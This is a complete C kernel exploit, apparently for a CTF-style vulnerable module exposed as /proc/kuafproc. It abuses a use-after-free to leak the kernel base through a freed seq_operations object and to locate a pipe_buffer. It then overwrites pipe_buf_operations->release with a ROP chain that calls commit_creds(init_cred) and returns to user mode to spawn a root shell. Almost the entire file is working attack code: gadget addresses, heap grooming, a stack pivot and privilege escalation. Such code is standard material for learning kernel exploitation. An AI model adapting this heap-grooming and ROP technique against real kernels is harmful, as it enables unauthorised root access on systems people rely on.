// gcc -masm=intel -static exploit.c -o exploit
// home/heap/uaf/pipe/exploit

#define _GNU_SOURCE
#include "mykernelpwn.h"

#define pop_rdi_ret 0xffffffff81060be1
#define pop_rcx_pop_rax_pop_rbp_ret 0xffffffff8102e351
#define push_rsi_pop_rsp_pop_rbp_ret 0xffffffff815a3fd8
// push    rsi
// pop     rsp
// sub     edx, 1
// and     edx, dword ptr [rdi + 0x20]
// imul    rdx, rdx, 0x28
// add     rdx, qword ptr [rsi + 0x98]
// cmp     qword ptr [rdx + 0x10], -0x7dfbe5c0
// jne     0xffffffffffffffc4
// or      rax, rcx
// pop     rbp
// ret

#define init_cred 0xffffffff826672a0
#define commit_creds 0xffffffff810d49b0
#define swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00ff0
#define single_start 0xffffffff81350580

struct kuaf_note {
    size_t idx;
    size_t size;
    char* buf;
};

struct note_data {
    size_t size;
    char* data;
};

int kuaf_fd;
void kuaf_add(size_t idx, size_t size, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x112233, &note);
}


void kuaf_edit(size_t idx, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x223344, &note);
}

//kfree(&notebook[idx]->data)
void kuaf_del(size_t idx)
{
    struct kuaf_note note = {
        .idx = idx,
    };
    ioctl(kuaf_fd, 0x334455, &note);
}

void kuaf_gift(void* buf)
{
    struct kuaf_note note = {
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x445566, &note);
}

// 把 notebook[idx]->data 数据读到 buf
ssize_t kuaf_read(int idx, void* buf)
{
    return read(kuaf_fd, buf, idx);
}

size_t SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
size_t INIT_CRED;
size_t POP_RDI_RET;
size_t POP_RCX_POP_RAX_POP_RBP_RET;
size_t PUSH_RSI_POP_RSP_POP_RBP_RET;
size_t COMMIT_CREDS;
long   seq_fd;

int main(int argc, char** argv, char** envp)
{
    struct note_data kernel_notebook[0x10];
    size_t buf[0x200], pipe_buffer_addr;
    int pipe_fd[2];

    save_status();
    bind_core(0);

    // 打开 proc
    kuaf_fd = open("/proc/kuafproc", O_RDWR);
    if (kuaf_fd < 0) {
        err_exit("Failed to open /proc/kuafproc!");
    }

    // 获得一个 seq_operations object
    note_info("Allocating seq_operations-size object...");
    kuaf_add(0, 0x20, buf);
    kuaf_del(0);
    // seq_operations
    seq_fd = open("/proc/self/stat", O_RDONLY);

    kuaf_read(0, buf);
    print_binary(buf, 0x20);
    kernel_offset = buf[0] - single_start;
    kernel_base += kernel_offset;
    printf("\033[32m\033[1m[+] Kernel offset: %p\033[0m\n", kernel_offset);
    printf("\033[32m\033[1m[+] Kernel base: %p\033[0m\n", kernel_base);

    SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE = swapgs_restore_regs_and_return_to_usermode + kernel_offset;
    SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE += 22;
    INIT_CRED = init_cred + kernel_offset;
    POP_RDI_RET = pop_rdi_ret + kernel_offset;
    PUSH_RSI_POP_RSP_POP_RBP_RET = push_rsi_pop_rsp_pop_rbp_ret + kernel_offset;
    POP_RCX_POP_RAX_POP_RBP_RET = pop_rcx_pop_rax_pop_rbp_ret + kernel_offset;
    COMMIT_CREDS = commit_creds + kernel_offset;

    // pipe_inode_info 大小
    memset(buf, 'A', sizeof(buf));
    kuaf_add(0x10, 192, buf);
    kuaf_add(0x11, 192, buf);
    kuaf_del(0x10);
    kuaf_del(0x11);
    // pipe_buffer 大小
    kuaf_add(0x12, 1024, buf);
    kuaf_add(0x13, 1024, buf);
    kuaf_del(0x12);
    kuaf_del(0x13);     // rop heap
    // 分配 pipe_inode_info, pipe_buffer
    pipe(pipe_fd);

    kuaf_read(0x11, buf);
    print_binary(buf, 192);
    pipe_buffer_addr = buf[19];     //倒数第二个指针
    printf("\033[32m\033[1m[+] Got pipe_buffer: %p\033[0m\n", pipe_buffer_addr);

    memset(buf, 'A', sizeof(buf));
    // pipe_buffer, rsi 指向 pipe_buffer
    buf[0] = 0;
    buf[1] = POP_RCX_POP_RAX_POP_RBP_RET;
    buf[2] = pipe_buffer_addr + 0x18;  // pipe_buffer->ops
    // pipe_buf_operations
    buf[3] = 0;
    buf[4] = PUSH_RSI_POP_RSP_POP_RBP_RET;     // pipe_buf_operations->release
    buf[5] = POP_RDI_RET;
    buf[6] = INIT_CRED;
    buf[7] = COMMIT_CREDS;
    buf[8] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
    buf[9] = 0;
    buf[10] = 0;
    buf[11] = (size_t)get_root_shell;
    buf[12] = user_cs;
    buf[13] = user_rflags;
    buf[14] = user_sp + 8; //system() wants it
    buf[15] = user_ss;

    // 绕过 add rdx, qword ptr [rsi + 0x98];cmp qword ptr [rdx + 0x10], -0x7dfbe5c0 检查
    buf[19] = pipe_buffer_addr + 0x18;
    kuaf_edit(0x13, buf);

    note_info("Trigerring pipe_buf_operations->release()...");
    close(pipe_fd[1]);
    close(pipe_fd[0]);

    return 0;
}